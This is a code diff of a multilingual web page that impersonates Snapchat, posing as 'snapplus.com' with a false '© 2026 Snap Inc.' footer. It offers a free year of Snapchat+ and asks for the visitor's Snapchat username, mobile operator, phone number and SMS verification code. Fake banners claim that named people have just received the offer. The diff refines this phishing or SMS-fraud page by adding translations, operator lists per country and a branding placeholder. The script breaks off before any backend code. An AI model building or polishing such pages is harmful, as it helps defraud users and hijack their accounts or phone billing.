@@ -16,7 +16,6 @@
             padding: 20px;
             position: relative;
         }
-        /* subtle grid background */
         body::before {
             content: '';
             position: fixed;
@@ -29,13 +28,57 @@
         }
         .container { width: 100%; max-width: 480px; position: relative; z-index: 1; }
 
-        /* Main card — glassmorphism */
+        /* ===== HIGHLIGHTED TOAST BANNER ===== */
+        .highlight-banner {
+            background: linear-gradient(135deg, rgba(255,252,0,0.12), rgba(255,215,0,0.08));
+            border: 1px solid rgba(255,252,0,0.2);
+            border-radius: 16px;
+            padding: 12px 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            animation: bannerGlow 3s ease-in-out infinite;
+            backdrop-filter: blur(4px);
+        }
+        .highlight-banner::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            background: linear-gradient(90deg, transparent, rgba(255,252,0,0.1), transparent);
+            animation: shimmer 4s ease-in-out infinite;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        @keyframes bannerGlow {
+            0%, 100% { box-shadow: 0 0 20px rgba(255,252,0,0.05); }
+            50% { box-shadow: 0 0 40px rgba(255,252,0,0.15); }
+        }
+        .highlight-banner .banner-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            position: relative;
+            z-index: 1;
+        }
+        .highlight-banner .banner-text .highlight-name {
+            color: #FFFC00;
+            font-weight: 700;
+            text-shadow: 0 0 30px rgba(255,252,0,0.3);
+        }
+        .highlight-banner .banner-text .highlight-emoji {
+            margin-right: 6px;
+        }
+
+        /* ===== MAIN CARD ===== */
         .card {
             background: rgba(22,22,38,0.85);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             border-radius: 40px;
-            padding: 32px 28px 28px;
+            padding: 28px 24px 24px;
             border: 1px solid rgba(255,255,255,0.06);
             box-shadow: 0 30px 80px rgba(0,0,0,0.6);
             transition: transform 0.3s ease;
@@ -47,23 +90,45 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
         .brand {
             display: flex;
             align-items: center;
             gap: 10px;
         }
-        .brand .ghost {
+        .brand .icon-container {
             width: 44px;
             height: 44px;
-            background: linear-gradient(135deg, #FFFC00, #FFD700);
-            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
-            box-shadow: 0 0 30px rgba(255,252,0,0.15);
+            border-radius: 50%;
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            box-shadow: 0 0 30px rgba(255,252,0,0.3), 0 0 60px rgba(255,252,0,0.1);
+            animation: iconPulse 3s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        .brand .icon-container img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 4px rgba(0,0,0,0.1));
+        }
+        /* Fallback if image fails to load */
+        .brand .icon-container .fallback-icon {
+            display: none;
+            font-size: 22px;
+        }
+        .brand .icon-container img:not([src]) + .fallback-icon,
+        .brand .icon-container img[src=""] + .fallback-icon,
+        .brand .icon-container img.error + .fallback-icon {
+            display: block;
+        }
+        @keyframes iconPulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(255,252,0,0.3), 0 0 60px rgba(255,252,0,0.1); }
+            50% { box-shadow: 0 0 50px rgba(255,252,0,0.5), 0 0 80px rgba(255,252,0,0.2); }
         }
         .brand h1 {
             font-size: 22px;
@@ -99,10 +164,10 @@
         /* ===== HERO ===== */
         .hero {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         .hero h2 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 800;
             color: #fff;
             line-height: 1.2;
@@ -111,134 +176,94 @@
         .hero h2 .highlight { color: #FFFC00; }
         .hero .sub {
             color: #999;
-            font-size: 14px;
-            margin-top: 6px;
+            font-size: 13px;
+            margin-top: 4px;
         }
 
         /* ===== BENEFITS ===== */
         .benefits {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 16px 0 20px;
+            gap: 6px;
+            margin: 12px 0 16px;
             background: rgba(255,255,255,0.03);
-            border-radius: 16px;
-            padding: 12px 14px;
+            border-radius: 14px;
+            padding: 10px 12px;
             border: 1px solid rgba(255,255,255,0.04);
         }
         .benefit-item {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
             color: #ccc;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
         }
-        .benefit-item .icon { font-size: 16px; }
+        .benefit-item .icon { font-size: 14px; }
         .benefit-item .label { color: #aaa; }
 
         /* ===== INFO ===== */
         .info-box {
             background: rgba(255,252,0,0.06);
-            border-radius: 14px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 16px;
             border-left: 3px solid #FFFC00;
+            transition: all 0.3s ease;
         }
         .info-box p {
             color: #aaa;
-            font-size: 13px;
+            font-size: 12px;
             line-height: 1.5;
+            transition: all 0.3s ease;
         }
         .info-box strong { color: #fff; }
 
         /* ===== COUNTRY SELECTOR ===== */
         .section-label {
             color: #aaa;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .country-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: 1fr 1fr;
             gap: 8px;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
         }
         .country-btn {
-            padding: 12px 6px;
-            border-radius: 14px;
+            padding: 10px 6px;
+            border-radius: 12px;
             border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.03);
             color: #aaa;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.3s;
             text-align: center;
         }
-        .country-btn .flag { font-size: 22px; display: block; margin-bottom: 4px; }
+        .country-btn .flag { font-size: 20px; display: block; margin-bottom: 2px; }
         .country-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
         .country-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
-        /* ===== INPUTS ===== */
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            color: #aaa;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 6px;
-        }
-        .input-group .input-wrap {
-            display: flex;
-            align-items: center;
-            background: rgba(255,255,255,0.04);
-            border-radius: 16px;
-            border: 2px solid rgba(255,255,255,0.06);
-            padding: 0 16px;
-            transition: all 0.3s;
-        }
-        .input-group .input-wrap:focus-within {
-            border-color: #FFFC00;
-            box-shadow: 0 0 30px rgba(255,252,0,0.04);
-        }
-        .input-group .input-wrap .prefix {
-            color: #888;
-            font-size: 16px;
-            font-weight: 500;
-            padding-right: 12px;
-            border-right: 1px solid rgba(255,255,255,0.06);
-        }
-        .input-group .input-wrap input {
-            flex: 1;
-            padding: 16px 12px;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #fff;
-            font-size: 16px;
-        }
-        .input-group .input-wrap input::placeholder { color: #444; }
-
-        /* Operator buttons */
+        /* ===== OPERATOR GRID ===== */
         .operator-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .operator-btn {
-            padding: 10px;
-            border-radius: 12px;
+            padding: 8px;
+            border-radius: 10px;
             border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.03);
             color: #aaa;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.3s;
@@ -247,13 +272,55 @@
         .operator-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
         .operator-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
+        /* ===== INPUTS ===== */
+        .input-group {
+            margin-bottom: 12px;
+        }
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .input-group .input-wrap {
+            display: flex;
+            align-items: center;
+            background: rgba(255,255,255,0.04);
+            border-radius: 14px;
+            border: 2px solid rgba(255,255,255,0.06);
+            padding: 0 14px;
+            transition: all 0.3s;
+        }
+        .input-group .input-wrap:focus-within {
+            border-color: #FFFC00;
+            box-shadow: 0 0 30px rgba(255,252,0,0.04);
+        }
+        .input-group .input-wrap .prefix {
+            color: #888;
+            font-size: 15px;
+            font-weight: 500;
+            padding-right: 10px;
+            border-right: 1px solid rgba(255,255,255,0.06);
+        }
+        .input-group .input-wrap input {
+            flex: 1;
+            padding: 14px 10px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 15px;
+        }
+        .input-group .input-wrap input::placeholder { color: #444; }
+
         /* ===== BUTTON ===== */
         .btn {
             width: 100%;
-            padding: 18px;
-            border-radius: 18px;
+            padding: 16px;
+            border-radius: 16px;
             border: none;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
@@ -266,18 +333,31 @@
         }
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.2); }
         .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; box-shadow: none; }
+        .btn-secondary {
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+            margin-top: 8px;
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            width: 100%;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
         /* ===== OTP ===== */
-        .otp-box { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
+        .otp-box { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
         .otp-box input {
-            width: 52px;
-            height: 58px;
+            width: 48px;
+            height: 54px;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             background: rgba(255,255,255,0.04);
             border: 2px solid rgba(255,255,255,0.08);
-            border-radius: 14px;
+            border-radius: 12px;
             color: #fff;
             outline: none;
             transition: all 0.3s;
@@ -290,25 +370,25 @@
         }
 
         /* ===== LOADER ===== */
-        .loader-wrap { text-align: center; padding: 20px 0; }
+        .loader-wrap { text-align: center; padding: 16px 0; }
         .loader-spinner {
-            width: 48px;
-            height: 48px;
+            width: 40px;
+            height: 40px;
             border: 3px solid rgba(255,255,255,0.06);
             border-top-color: #FFFC00;
             border-radius: 50%;
-            margin: 0 auto 16px;
+            margin: 0 auto 12px;
             animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loader-text { color: #888; font-size: 15px; text-align: center; margin-top: 12px; }
+        .loader-text { color: #888; font-size: 14px; text-align: center; margin-top: 8px; }
         .loader-text strong { color: #fff; }
-        .progress-track { width: 100%; height: 4px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; margin-top: 16px; }
+        .progress-track { width: 100%; height: 3px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; margin-top: 12px; }
         .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700); border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
 
         /* ===== SUCCESS / ERROR ===== */
-        .icon-big { font-size: 64px; text-align: center; margin: 12px 0 16px; }
-        .msg-center { text-align: center; color: #aaa; font-size: 16px; line-height: 1.7; }
+        .icon-big { font-size: 56px; text-align: center; margin: 8px 0 12px; }
+        .msg-center { text-align: center; color: #aaa; font-size: 15px; line-height: 1.7; }
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
 
@@ -317,11 +397,11 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 20px;
-            padding-top: 16px;
+            margin-top: 16px;
+            padding-top: 12px;
             border-top: 1px solid rgba(255,255,255,0.04);
             color: rgba(255,255,255,0.15);
-            font-size: 11px;
+            font-size: 10px;
         }
         .footer a { color: rgba(255,255,255,0.2); text-decoration: none; }
         .footer a:hover { color: #FFFC00; }
@@ -337,509 +417,743 @@
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .card { padding: 24px 16px; }
-            .hero h2 { font-size: 22px; }
-            .benefits { grid-template-columns: 1fr 1fr; gap: 6px; padding: 10px; }
-            .benefit-item { font-size: 12px; }
-            .country-grid { grid-template-columns: 1fr 1fr 1fr; }
+            .card { padding: 20px 14px; }
+            .hero h2 { font-size: 20px; }
+            .benefits { grid-template-columns: 1fr 1fr; gap: 4px; padding: 8px 10px; }
+            .benefit-item { font-size: 11px; }
+            .country-grid { grid-template-columns: 1fr 1fr; }
             .operator-grid { grid-template-columns: 1fr 1fr 1fr; }
-            .otp-box input { width: 44px; height: 50px; font-size: 20px; }
+            .otp-box input { width: 40px; height: 46px; font-size: 18px; }
             .brand h1 { font-size: 18px; }
-            .brand .ghost { width: 36px; height: 36px; font-size: 18px; }
+            .brand .icon-container { width: 36px; height: 36px; }
+            .brand .icon-container img { width: 26px; height: 26px; }
+            .highlight-banner .banner-text { font-size: 13px; }
+            .highlight-banner { padding: 10px 14px; }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="card">
-
-        <!-- ===== HEADER ===== -->
-        <div class="header">
-            <div class="brand">
-                <div class="ghost">👻</div>
-                <div>
-                    <h1>snap<span>chat</span>+</h1>
-                    <div class="domain">snapplus.com</div>
-                </div>
-            </div>
-            <div class="lang-switch">
-                <button class="active" data-lang="fr">FR</button>
-                <button data-lang="en">EN</button>
-                <button data-lang="nl">NL</button>
+    <!-- ===== HIGHLIGHTED BANNER ===== -->
+    <div class="container">
+        <div class="highlight-banner">
+            <div class="banner-text">
+                <span class="highlight-emoji">🎁</span>
+                <span class="highlight-name" id="bannerName">Hugo</span>
+                <span id="bannerAction">vient de recevoir son Snap+ !</span>
             </div>
         </div>
 
-        <!-- ===== STEP 1: COUNTRY + PHONE ===== -->
-        <div id="step1" class="step active">
+        <div class="card">
 
-            <!-- Hero -->
-            <div class="hero">
-                <h2>Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !</h2>
-                <p class="sub">🎁 <span id="liveToast">Élodie</span> vient de recevoir son Snap+ !</p>
-            </div>
-
-            <!-- Benefits -->
-            <div class="benefits">
-                <div class="benefit-item"><span class="icon">✨</span> <span class="label">Badges exclusifs</span></div>
-                <div class="benefit-item"><span class="icon">👀</span> <span class="label">Qui a revu votre story</span></div>
-                <div class="benefit-item"><span class="icon">📈</span> <span class="label">Boost de score</span></div>
-                <div class="benefit-item"><span class="icon">⏳</span> <span class="label">Offre limitée</span></div>
-            </div>
-
-            <!-- Info -->
-            <div class="info-box">
-                <p>📱 <strong>Disponible uniquement</strong> pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.</p>
-            </div>
-
-            <!-- Country -->
-            <div class="section-label">🌍 Pays</div>
-            <div class="country-grid" id="countryGrid">
-                <div class="country-btn selected" data-country="FR"><span class="flag">🇫🇷</span> France</div>
-                <div class="country-btn" data-country="BE"><span class="flag">🇧🇪</span> Belgique</div>
-                <div class="country-btn" data-country="CH"><span class="flag">🇨🇭</span> Suisse</div>
-            </div>
-
-            <!-- Username -->
-            <div class="input-group">
-                <label for="usernameInput">👤 Nom d'utilisateur Snapchat</label>
-                <div class="input-wrap">
-                    <span class="prefix">@</span>
-                    <input type="text" id="usernameInput" placeholder="votre_snap" maxlength="30" />
+            <!-- ===== HEADER ===== -->
+            <div class="header">
+                <div class="brand">
+                    <div class="icon-container">
+                        <!-- ========================================= -->
+                        <!-- REPLACE THE SRC BELOW WITH YOUR IMAGE URL -->
+                        <!-- ========================================= -->
+                        <img src="snapchat-icon.png" alt="Snapchat+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+                        <span class="fallback-icon">⭐</span>
+                    </div>
+                    <div>
+                        <h1>snap<span>chat</span>+</h1>
+                        <div class="domain">snapplus.com</div>
+                    </div>
+                </div>
+                <div class="lang-switch">
+                    <button class="active" data-lang="fr">FR</button>
+                    <button data-lang="en">EN</button>
+                    <button data-lang="nl">NL</button>
                 </div>
             </div>
 
-            <!-- Operator -->
-            <div class="section-label">📡 Opérateur mobile</div>
-            <div class="operator-grid" id="operatorGrid">
-                <div class="operator-btn" data-operator="SFR">SFR</div>
-                <div class="operator-btn" data-operator="Bouygues">Bouygues</div>
-                <div class="operator-btn selected" data-operator="Orange">Orange</div>
-            </div>
+            <!-- ===== STEP 1: COUNTRY + PHONE ===== -->
+            <div id="step1" class="step active">
 
-            <!-- Phone -->
-            <div class="input-group">
-                <label for="phoneInput">📞 Numéro de téléphone</label>
-                <div class="input-wrap">
-                    <span class="code" id="countryCode">+33</span>
-                    <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
+                <!-- Hero -->
+                <div class="hero">
+                    <h2 id="heroTitle">Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !</h2>
                 </div>
-                <div style="margin-top:6px; color:#555; font-size:12px;">Numéro mobile France (10 chiffres) — c'est pour savoir si vous êtes un humain 🐻</div>
+
+                <!-- Benefits -->
+                <div class="benefits">
+                    <div class="benefit-item"><span class="icon">✨</span> <span class="label" id="benefit1">Badges exclusifs</span></div>
+                    <div class="benefit-item"><span class="icon">👀</span> <span class="label" id="benefit2">Qui a revu votre story</span></div>
+                    <div class="benefit-item"><span class="icon">📈</span> <span class="label" id="benefit3">Boost de score</span></div>
+                    <div class="benefit-item"><span class="icon">⏳</span> <span class="label" id="benefit4">Offre limitée</span></div>
+                </div>
+
+                <!-- Info -->
+                <div class="info-box">
+                    <p id="infoText">📱 <strong>Disponible uniquement</strong> pour les numéros <span id="countryNameInInfo">France</span> des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.</p>
+                </div>
+
+                <!-- Country -->
+                <div class="section-label" id="countryLabel">🌍 Pays</div>
+                <div class="country-grid" id="countryGrid">
+                    <div class="country-btn selected" data-country="FR"><span class="flag">🇫🇷</span> <span class="country-name">France</span></div>
+                    <div class="country-btn" data-country="BE"><span class="flag">🇧🇪</span> <span class="country-name">Belgique</span></div>
+                </div>
+
+                <!-- Username -->
+                <div class="input-group">
+                    <label for="usernameInput" id="usernameLabel">👤 Nom d'utilisateur Snapchat</label>
+                    <div class="input-wrap">
+                        <span class="prefix">@</span>
+                        <input type="text" id="usernameInput" placeholder="votre_snap" maxlength="30" />
+                    </div>
+                </div>
+
+                <!-- Operator -->
+                <div class="section-label" id="operatorLabel">📡 Opérateur mobile</div>
+                <div class="operator-grid" id="operatorGrid">
+                    <!-- Populated by JS -->
+                </div>
+
+                <!-- Phone -->
+                <div class="input-group">
+                    <label for="phoneInput" id="phoneLabel">📞 Numéro de téléphone</label>
+                    <div class="input-wrap">
+                        <span class="code" id="countryCode">+33</span>
+                        <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
+                    </div>
+                    <div style="margin-top:4px; color:#555; font-size:11px;" id="phoneHint">Numéro mobile (10 chiffres) — c'est pour savoir si vous êtes un humain 🐻</div>
+                </div>
+
+                <button class="btn btn-primary" id="sendBtn">Continuer →</button>
             </div>
 
-            <button class="btn btn-primary" id="sendBtn">Continuer →</button>
-        </div>
-
-        <!-- ===== STEP 2: LOADING ===== -->
-        <div id="step2" class="step">
-            <div class="loader-wrap">
-                <div class="loader-spinner"></div>
-                <div class="loader-text" id="loadingText">⏳ Envoi du code de vérification...</div>
-                <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
-            </div>
-        </div>
-
-        <!-- ===== STEP 3: OTP ===== -->
-        <div id="step3" class="step">
-            <div class="hero">
-                <h2>🔑 Code de vérification</h2>
-                <p class="sub">Nous avons envoyé un code à <strong id="displayNumber"></strong></p>
-            </div>
-            <div class="otp-box" id="otpContainer"></div>
-            <button class="btn btn-primary" id="verifyBtn">Vérifier →</button>
-            <div id="verifyingMessage" style="display:none; text-align:center; color:#FFFC00; margin-top:12px;">
-                ⏳ Vérification en cours...
-            </div>
-            <button class="btn btn-secondary" style="background:rgba(255,255,255,0.06); color:#fff; margin-top:10px; padding:14px; border-radius:14px; border:none; width:100%; font-size:16px; cursor:pointer;" id="backToPhone">← Retour</button>
-        </div>
-
-        <!-- ===== STEP 4: SUCCESS ===== -->
-        <div id="step4" class="step">
-            <div class="icon-big">✅</div>
-            <div class="hero">
-                <h2 style="color:#69db7c;">Félicitations !</h2>
-                <p class="sub" style="color:#aaa;">Votre compte Snapchat+ est maintenant actif pour 1 an !</p>
-                <div style="margin-top:16px; padding:12px; background:rgba(255,252,0,0.08); border-radius:14px; border:1px solid rgba(255,252,0,0.15);">
-                    <span style="color:#FFFC00;">🎉 Snapchat+ activé !</span>
+            <!-- ===== STEP 2: LOADING ===== -->
+            <div id="step2" class="step">
+                <div class="loader-wrap">
+                    <div class="loader-spinner"></div>
+                    <div class="loader-text" id="loadingText">⏳ Envoi du code de vérification...</div>
+                    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
                 </div>
             </div>
-            <button class="btn btn-primary" id="resetBtn">Ouvrir Snapchat</button>
-        </div>
 
-        <!-- ===== STEP 5: ERROR ===== -->
-        <div id="step5" class="step">
-            <div class="icon-big">❌</div>
-            <div class="hero">
-                <h2 style="color:#ff6b6b;">Numéro invalide</h2>
-                <p class="sub" style="color:#aaa;">Le numéro que vous avez saisi est incorrect. Veuillez réessayer.</p>
+            <!-- ===== STEP 3: OTP ===== -->
+            <div id="step3" class="step">
+                <div class="hero">
+                    <h2 id="otpTitle" style="font-size:22px;">🔑 Code de vérification</h2>
+                    <p class="sub" id="otpSub">Nous avons envoyé un code à <strong id="displayNumber"></strong></p>
+                </div>
+                <div class="otp-box" id="otpContainer"></div>
+                <button class="btn btn-primary" id="verifyBtn">Vérifier →</button>
+                <div id="verifyingMessage" style="display:none; text-align:center; color:#FFFC00; margin-top:10px; font-size:14px;">
+                    ⏳ Vérification en cours...
+                </div>
+                <button class="btn btn-secondary" id="backToPhone">← Retour</button>
             </div>
-            <button class="btn btn-primary" id="retryBtn" style="background: #ff6b6b; color:#fff;">Réessayer</button>
-        </div>
 
-        <!-- ===== FOOTER ===== -->
-        <div class="footer">
-            <span>© 2026 Snap Inc.</span>
-            <a href="#">Cloudflare Privacy</a>
-            <a href="#">Help</a>
-        </div>
+            <!-- ===== STEP 4: SUCCESS ===== -->
+            <div id="step4" class="step">
+                <div class="icon-big">✅</div>
+                <div class="hero">
+                    <h2 style="color:#69db7c; font-size:22px;" id="successTitle">Félicitations !</h2>
+                    <p class="sub" style="color:#aaa; font-size:14px;" id="successText">Votre compte Snapchat+ est maintenant actif pour 1 an !</p>
+                    <div style="margin-top:12px; padding:10px; background:rgba(255,252,0,0.08); border-radius:12px; border:1px solid rgba(255,252,0,0.15);">
+                        <span style="color:#FFFC00; font-size:14px; font-weight:600;" id="successBadge">🎉 Snapchat+ activé !</span>
+                    </div>
+                </div>
+                <button class="btn btn-primary" id="resetBtn">Ouvrir Snapchat</button>
+            </div>
 
+            <!-- ===== STEP 5: ERROR ===== -->
+            <div id="step5" class="step">
+                <div class="icon-big">❌</div>
+                <div class="hero">
+                    <h2 style="color:#ff6b6b; font-size:22px;" id="errorTitle">Numéro invalide</h2>
+                    <p class="sub" style="color:#aaa; font-size:14px;" id="errorText">Le numéro que vous avez saisi est incorrect. Veuillez réessayer.</p>
+                </div>
+                <button class="btn btn-primary" id="retryBtn" style="background: #ff6b6b; color:#fff;">Réessayer</button>
+            </div>
+
+            <!-- ===== FOOTER ===== -->
+            <div class="footer">
+                <span>© 2026 Snap Inc.</span>
+                <a href="#">Cloudflare Privacy</a>
+                <a href="#">Help</a>
+            </div>
+
+        </div>
     </div>
-</div>
 
-<script>
-    // ============================================================
-    // STATE
-    // ============================================================
-    let selectedCountry = null;
-    let selectedOperator = null;
-    let queueId = null;
-    let otpLength = 4;
-    let currentLang = 'fr';
+    <script>
+        // ============================================================
+        // TRANSLATIONS
+        // ============================================================
+        const LANG = {
+            fr: {
+                heroTitle: 'Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !',
+                benefit1: 'Badges exclusifs',
+                benefit2: 'Qui a revu votre story',
+                benefit3: 'Boost de score',
+                benefit4: 'Offre limitée',
+                infoTextFR: '📱 <strong>Disponible uniquement</strong> pour les numéros <span id="countryNameInInfo">France</span> des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.',
+                infoTextBE: '📱 <strong>Disponible uniquement</strong> pour les numéros <span id="countryNameInInfo">Belgique</span> des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.',
+                countryLabel: '🌍 Pays',
+                france: 'France',
+                belgium: 'Belgique',
+                usernameLabel: '👤 Nom d\'utilisateur Snapchat',
+                usernamePlaceholder: 'votre_snap',
+                operatorLabel: '📡 Opérateur mobile',
+                phoneLabel: '📞 Numéro de téléphone',
+                phoneHint: 'Numéro mobile (10 chiffres) — c\'est pour savoir si vous êtes un humain 🐻',
+                sendBtn: 'Continuer →',
+                loadingText: '⏳ Envoi du code de vérification...',
+                otpTitle: '🔑 Code de vérification',
+                otpSub: 'Nous avons envoyé un code à <strong>{number}</strong>',
+                verifyBtn: 'Vérifier →',
+                verifying: '⏳ Vérification en cours...',
+                back: '← Retour',
+                successTitle: 'Félicitations !',
+                successText: 'Votre compte Snapchat+ est maintenant actif pour 1 an !',
+                successBadge: '🎉 Snapchat+ activé !',
+                resetBtn: 'Ouvrir Snapchat',
+                errorTitle: 'Numéro invalide',
+                errorText: 'Le numéro que vous avez saisi est incorrect. Veuillez réessayer.',
+                retryBtn: 'Réessayer',
+                bannerAction: 'vient de recevoir son Snap+ !'
+            },
+            en: {
+                heroTitle: 'Activate <span class="highlight">Snapchat+</span><br />free for 1 year!',
+                benefit1: 'Exclusive Badges',
+                benefit2: 'Who viewed your story',
+                benefit3: 'Score Boost',
+                benefit4: 'Limited Offer',
+                infoTextFR: '📱 <strong>Available only</strong> for <span id="countryNameInInfo">France</span> numbers from the operators listed below — all others do not work.',
+                infoTextBE: '📱 <strong>Available only</strong> for <span id="countryNameInInfo">Belgium</span> numbers from the operators listed below — all others do not work.',
+                countryLabel: '🌍 Country',
+                france: 'France',
+                belgium: 'Belgium',
+                usernameLabel: '👤 Snapchat Username',
+                usernamePlaceholder: 'your_snap',
+                operatorLabel: '📡 Mobile Operator',
+                phoneLabel: '📞 Phone Number',
+                phoneHint: 'Mobile number (10 digits) — this is to check if you are human 🐻',
+                sendBtn: 'Continue →',
+                loadingText: '⏳ Sending verification code...',
+                otpTitle: '🔑 Verification Code',
+                otpSub: 'We sent a code to <strong>{number}</strong>',
+                verifyBtn: 'Verify →',
+                verifying: '⏳ Verifying...',
+                back: '← Back',
+                successTitle: 'Congratulations!',
+                successText: 'Your Snapchat+ account is now active for 1 year!',
+                successBadge: '🎉 Snapchat+ activated!',
+                resetBtn: 'Open Snapchat',
+                errorTitle: 'Invalid Number',
+                errorText: 'The number you entered is incorrect. Please try again.',
+                retryBtn: 'Try Again',
+                bannerAction: 'just received their Snap+!'
+            },
+            nl: {
+                heroTitle: 'Activeer <span class="highlight">Snapchat+</span><br />gratis voor 1 jaar!',
+                benefit1: 'Exclusieve badges',
+                benefit2: 'Wie heeft je story bekeken',
+                benefit3: 'Score Boost',
+                benefit4: 'Beperkte aanbieding',
+                infoTextFR: '📱 <strong>Alleen beschikbaar</strong> voor <span id="countryNameInInfo">Frankrijk</span> nummers van de onderstaande providers — alle anderen werken niet.',
+                infoTextBE: '📱 <strong>Alleen beschikbaar</strong> voor <span id="countryNameInInfo">België</span> nummers van de onderstaande providers — alle anderen werken niet.',
+                countryLabel: '🌍 Land',
+                france: 'Frankrijk',
+                belgium: 'België',
+                usernameLabel: '👤 Snapchat Gebruikersnaam',
+                usernamePlaceholder: 'jouw_snap',
+                operatorLabel: '📡 Mobiele Provider',
+                phoneLabel: '📞 Telefoonnummer',
+                phoneHint: 'Mobiel nummer (10 cijfers) — dit is om te controleren of je een mens bent 🐻',
+                sendBtn: 'Doorgaan →',
+                loadingText: '⏳ Verificatiecode verzenden...',
+                otpTitle: '🔑 Verificatiecode',
+                otpSub: 'We hebben een code gestuurd naar <strong>{number}</strong>',
+                verifyBtn: 'Verifiëren →',
+                verifying: '⏳ Bezig met verifiëren...',
+                back: '← Terug',
+                successTitle: 'Gefeliciteerd!',
+                successText: 'Je Snapchat+ account is nu 1 jaar actief!',
+                successBadge: '🎉 Snapchat+ geactiveerd!',
+                resetBtn: 'Open Snapchat',
+                errorTitle: 'Ongeldig nummer',
+                errorText: 'Het nummer dat u heeft ingevoerd is onjuist. Probeer opnieuw.',
+                retryBtn: 'Probeer opnieuw',
+                bannerAction: 'heeft zojuist zijn Snap+ ontvangen!'
+            }
+        };
 
-    const COUNTRIES = {
-        FR: { code: '+33', queue: 'A' },
-        BE: { code: '+32', queue: 'B' },
-        CH: { code: '+41', queue: 'C' }
-    };
+        // ============================================================
+        // OPERATORS BY COUNTRY
+        // ============================================================
+        const OPERATORS = {
+            FR: ['Orange', 'SFR', 'Bouygues'],
+            BE: ['Proximus', 'Orange BE', 'BASE', 'Telenet']
+        };
 
-    // ============================================================
-    // DOM REFS
-    // ============================================================
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const step3 = document.getElementById('step3');
-    const step4 = document.getElementById('step4');
-    const step5 = document.getElementById('step5');
+        // ============================================================
+        // STATE
+        // ============================================================
+        let selectedCountry = 'FR';
+        let selectedOperator = 'Orange';
+        let queueId = null;
